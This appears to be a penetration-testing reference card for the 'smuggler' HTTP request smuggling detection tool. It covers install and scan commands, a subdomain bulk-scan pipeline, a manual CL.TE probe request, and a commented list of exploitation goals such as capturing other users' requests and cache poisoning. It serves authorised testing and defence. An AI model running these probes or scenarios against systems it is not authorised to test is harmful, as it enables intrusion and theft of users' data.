---
name: smuggler
description: "Auth/lab ref: HTTP/1.1 request smuggling and desync detection tool testing CL.TE, TE.CL, and TE.TE variants."
license: MIT
compatibility: "Linux / macOS / Windows; Python 3."
metadata:
  author: AeonDave
  version: "1.0"
---

# smuggler

HTTP request smuggling / desync detection — CL.TE, TE.CL, TE.TE variants.

## Quick Start

```bash
git clone https://github.com/defparam/smuggler
cd smuggler && pip3 install -r requirements.txt

# Single target
python3 smuggler.py -u https://target.com/endpoint

# Pipe a list of URLs
cat urls.txt | python3 smuggler.py

# Quiet mode (only show findings)
python3 smuggler.py -u https://target.com -q

# Exit on first finding per host
python3 smuggler.py -u https://target.com -x
```

## Core Flags

| Flag | Purpose |
|------|---------|
| `-u, --url <url>` | Target URL with endpoint |
| `-v, --vhost <host>` | Override Host header (virtual host) |
| `-x, --exit_early` | Exit on first finding (useful in bulk mode) |
| `-m, --method <verb>` | HTTP method (default: POST) |
| `-l, --log <file>` | Write output to file + stdout |
| `-q, --quiet` | Suppress non-finding output |
| `-t, --timeout <s>` | Socket timeout (default: 5) |
| `--no-color` | Suppress color codes (for piping/logs) |
| `-c, --configfile <file>` | Custom payload config file |

## Vulnerability Types Detected

| Type | Frontend | Backend | Description |
|------|----------|---------|-------------|
| **CL.TE** | Content-Length | Transfer-Encoding | Frontend routes by CL; backend parses chunked TE |
| **TE.CL** | Transfer-Encoding | Content-Length | Frontend routes chunked; backend expects CL |
| **TE.TE** | Transfer-Encoding | Transfer-Encoding | Both parse TE but one can be obfuscated |

## How It Works

smuggler sends mutations of CL/TE headers to detect desync behavior via:
1. **Timing attacks** — a smuggled keep-alive request causes the connection to hang
2. **Differential responses** — subsequent request returns part of the smuggled request

Each mutation is sent with precise socket-level control (no HTTP libraries that auto-normalize headers).

## Bulk Scan

```bash
# Using subfinder + httpx to build target list, then smuggle-test
subfinder -d target.com | httpx -silent | python3 smuggler.py -q -x

# From existing URL list
cat endpoints.txt | python3 smuggler.py -l smuggler-results.txt -q
```

## Manual Verification with Repeater

After smuggler reports a potential issue, confirm manually in Burp Repeater:

```http
# CL.TE probe — send with Connection: keep-alive
POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

X
```

If response is delayed or error changes between requests → real desync.

## Common Exploitation Scenarios

```
# 1. Bypass front-end access controls
# Smuggle a request to a restricted path hidden in the body

# 2. Capture other users' requests
# Poison backend socket to prepend attacker-controlled prefix to next user's request

# 3. Cache poisoning
# Smuggle a request that causes malicious response to be cached for next user

# 4. Web cache deception
# Smuggle static-looking path to cache authenticated response
```

## Important Note

smuggler can produce false positives on large CDN/proxy providers (Google, AWS, Akamai). Always manually verify before reporting or exploiting. Use `-q -x` in bulk scans to minimize noise.

## References

- [smuggler GitHub](https://github.com/defparam/smuggler)
- [PortSwigger HTTP Request Smuggling Lab](https://portswigger.net/web-security/request-smuggling)
- [Payload configuration](https://github.com/defparam/smuggler/blob/master/config.py)
